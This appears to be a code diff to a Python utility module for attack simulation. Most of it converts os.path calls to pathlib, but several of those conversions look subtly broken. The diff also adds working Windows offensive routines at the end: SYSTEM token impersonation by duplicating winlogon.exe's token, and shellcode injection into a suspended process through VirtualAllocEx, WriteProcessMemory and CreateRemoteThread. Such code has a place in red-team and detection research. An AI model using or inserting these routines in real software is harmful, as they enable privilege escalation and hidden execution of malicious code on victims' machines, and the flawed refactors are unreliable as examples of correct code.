@@ -24,6 +24,8 @@ from pathlib import Path
 from typing import Iterable, Optional, Union
 
 
+
+    
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 long_t = type(1 << 63)
@@ -67,11 +69,65 @@ else:
 if CURRENT_OS == WINDOWS:
     CMD_PATH = os.environ.get("COMSPEC")
     POWERSHELL_PATH = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    import ctypes
+    import win32process
+    import win32file
+    import win32service
+    import win32api, win32security
+    from ctypes import byref, windll, wintypes
+    from ctypes.wintypes import BOOL
+    from ctypes.wintypes import DWORD
+    from ctypes.wintypes import HANDLE
+    from ctypes.wintypes import LPVOID
+    from ctypes.wintypes import LPCVOID
+    # Windows related constants and classes
+    TH32CS_SNAPPROCESS = 0x00000002
+    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+    TOKEN_DUPLICATE = 0x0002
+    TOKEN_ALL_ACCESS = 0xf00ff
+    MAX_PATH = 260
+    BOOL = ctypes.c_int
+    DWORD = ctypes.c_uint32
+    HANDLE = ctypes.c_void_p
+    LONG = ctypes.c_int32
+    NULL_T = ctypes.c_void_p
+    SIZE_T = ctypes.c_uint
+    TCHAR = ctypes.c_char
+    USHORT = ctypes.c_uint16
+    UCHAR = ctypes.c_ubyte
+    ULONG = ctypes.c_uint32
+
+    class PROCESSENTRY32(ctypes.Structure):
+        _fields_ = [
+            ('dwSize', DWORD),
+            ('cntUsage', DWORD),
+            ('th32ProcessID', DWORD),
+            ('th32DefaultHeapID', NULL_T),
+            ('th32ModuleID', DWORD),
+            ('cntThreads', DWORD),
+            ('th32ParentProcessID', DWORD),
+            ('pcPriClassBase', LONG),
+            ('dwFlags', DWORD),
+            ('szExeFile', TCHAR * MAX_PATH)
+        ]
+
+    LPCSTR = LPCTSTR = ctypes.c_char_p
+    LPDWORD = PDWORD = ctypes.POINTER(DWORD)
+
+    class _SECURITY_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [('nLength', DWORD),
+                    ('lpSecurityDescriptor', LPVOID),
+                    ('bInheritHandle', BOOL), ]
+
+    SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
+    LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
+    LPTHREAD_START_ROUTINE = LPVOID
+
 else:
     CMD_PATH = "/bin/sh"
     POWERSHELL_PATH = None
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BASE_DIR = Path(__file__).resolve().parent
 ALL_IP = "0.0.0.0"
 IP_REGEX = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
 CALLBACK_REGEX = r"https?://" + IP_REGEX + r":\d+"
@@ -120,6 +176,7 @@ def requires_os(*os_list: str):
         @functools.wraps(f)
         def decorated(*args, **kwargs):
             if CURRENT_OS not in os_list:
+                # NOTE os.path.relpath supports Path objects and does not exist in pathlib
                 filename = os.path.relpath(inspect.getsourcefile(f))
                 func_name = f.__name__
 
@@ -135,7 +192,7 @@ def requires_os(*os_list: str):
 def check_dependencies(*paths: str) -> bool:
     missing = []
     for path in paths:
-        if not os.path.exists(path):
+        if not Path(path).exists():
             log("Missing dependency %s" % path, "!")
             missing.append(path)
     return len(missing) == 0
@@ -144,7 +201,7 @@ def check_dependencies(*paths: str) -> bool:
 def dependencies(*paths: str):
     missing = []
     for path in paths:
-        if not os.path.exists(path):
+        if not Path(path).exists():
             missing.append(path)
 
     def decorator(f):
@@ -153,6 +210,7 @@ def dependencies(*paths: str):
             if len(missing):
                 log("Missing dependencies for %s:%s()" % (f.func_code.co_filename, f.func_code.co_name), "!")
                 for dep in missing:
+                    # NOTE os.path.relpath supports Path objects and does not exist in pathlib
                     print("    - %s" % os.path.relpath(dep, BASE_DIR))
                 return MISSING_DEPENDENCIES
             return f(*args, **kwargs)
@@ -181,8 +239,8 @@ def temporary_file(contents, file_name=None):
 
 
 def temporary_file_helper(contents, file_name=None):
-    if not (file_name and os.path.isabs(file_name)):
-        file_name = os.path.join(tempfile.gettempdir(), file_name or f"temp{hash(contents):d}")
+    if not (file_name and Path(file_name).is_absolute()):
+        file_name = Path(tempfile.gettempdir()) / file_name or f"temp{hash(contents):d}"
 
     with open(file_name, "wb" if isinstance(contents, bytes) else "w") as f:
         f.write(contents)
@@ -317,14 +375,13 @@ def link_file(source, target):
     log("Linking %s -> %s" % (source, target))
     execute(["ln", "-s", source, target])
 
-
-def remove_file(path):
-    if os.path.exists(path):
+def remove_file(path: str):
+    if Path(path).is_file():
         log("Removing %s" % path, log_type="-")
         # Try three times to remove the file
         for _ in range(3):
             try:
-                os.remove(path)
+                Path(path).unlink()
             except OSError:
                 time.sleep(0.25)
             else:
@@ -332,12 +389,11 @@ def remove_file(path):
 
 
 def remove_directory(path):
-    if os.path.exists(path):
-        if os.path.isdir(path):
-            log(f"Removing directory {path:s}", log_type="-")
-            shutil.rmtree(path)
-        else:
-            remove_file(path)
+    if Path(path).is_dir():
+        log(f"Removing directory {path:s}", log_type="-")
+        shutil.rmtree(path)
+    else:
+        remove_file(path)
 
 
 def is_64bit():
@@ -478,9 +534,9 @@ def get_ipv4_address(hostname):
 def find_writeable_directory(base_dir):
     for root, dirs, files in os.walk(base_dir):
         for d in dirs:
-            subdir = os.path.join(base_dir, d)
+            subdir = Path(base_dir) / d
             try:
-                test_file = os.path.join(subdir, "test_file")
+                test_file = Path(subdir) / "test_file"
                 f = open(test_file, "w")
                 f.close()
                 os.remove(test_file)
@@ -501,10 +557,11 @@ def run_system(arguments=None):
         return None
 
     if arguments is None:
+        # NOTE os.path.relpath supports Path objects and does not exist in pathlib
         arguments = [sys.executable, os.path.abspath(sys.argv[0])] + sys.argv[1:]
 
     log("Attempting to elevate to SYSTEM using PsExec")
-    if not os.path.exists(PS_EXEC):
+    if not Path(PS_EXEC).is_file():
         log("PsExec not found", log_type="-")
         return MISSING_PSEXEC
 
@@ -661,7 +718,7 @@ def enable_logon_auditing(host="localhost", verbose=True, sleep=2):
 
 def print_file(path):
     print(path)
-    if not os.path.exists(path):
+    if not Path(path).is_file():
         print("--- NOT FOUND ----")
     else:
         print("-" * 16)
@@ -669,3 +726,88 @@ def print_file(path):
             print(f.read().rstrip())
 
     print("")
+
+
+# return pid by process.name
+@requires_os('windows')
+def getppid(pname):
+    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot 
+    Process32First = ctypes.windll.kernel32.Process32First  
+    Process32Next = ctypes.windll.kernel32.Process32Next 
+    CloseHandle = ctypes.windll.kernel32.CloseHandle 
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) 
+    pe32 = PROCESSENTRY32() 
+    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
+    current_pid = os.getpid()
+
+
+    if Process32First(hProcessSnap, ctypes.byref(pe32)) == 0:
+     print(f"[x] - Failed getting first process.")
+     return
+
+    while True:
+        procname = pe32.szExeFile.decode("utf-8").lower()
+        if pname.lower() in procname:
+            CloseHandle(hProcessSnap)
+            return pe32.th32ProcessID
+        if not Process32Next(hProcessSnap, ctypes.byref(pe32)):
+            CloseHandle(hProcessSnap)
+            return None
+
+@requires_os('windows')
+def impersonate_system(): 
+     try: 
+        hp = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, getppid("winlogon.exe"))
+        th = win32security.OpenProcessToken(hp, TOKEN_DUPLICATE)
+        new_tokenh = win32security.DuplicateTokenEx(th, 2, TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
+        win32security.ImpersonateLoggedOnUser(new_tokenh)
+        print(f"[+] - Impersonated System Token via Winlogon")
+        win32api.CloseHandle(hp)
+     except Exception as e:
+            print(f"[x] - Failed To Impersonate System Token via Winlogon")
+            
+@requires_os('windows')
+def Inject(path, shellcode):
+    import ctypes, time
+    import ctypes.wintypes
+
+    from ctypes.wintypes import BOOL
+    from ctypes.wintypes import DWORD
+    from ctypes.wintypes import HANDLE
+    from ctypes.wintypes import LPVOID
+    from ctypes.wintypes import LPCVOID
+    import win32process
+    # created suspended process
+    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
+    page_rwx_value = 0x40
+    process_all = 0x1F0FFF
+    memcommit = 0x00001000
+
+    if info[0].handle > 0 :
+       print(f"[+] - Created {path} Suspended")
+    shellcode_length = len(shellcode)
+    process_handle = info[0].handle  # phandle
+    VirtualAllocEx = windll.kernel32.VirtualAllocEx
+    VirtualAllocEx.restype = LPVOID
+    VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)
+
+    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+    WriteProcessMemory.restype = BOOL
+    WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)
+    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
+    CreateRemoteThread.restype = HANDLE
+    CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)
+
+    # allocate RWX memory
+    lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
+    print(f'[+] - Allocated remote memory at {hex(lpBuffer)}')
+
+    # write shellcode in allocated memory
+    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+    if res > 0 :
+        print('[+] - Shellcode written.')
+
+    # create remote thread to start shellcode execution
+    CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
+    print('[+] - Shellcode Injection, done.')
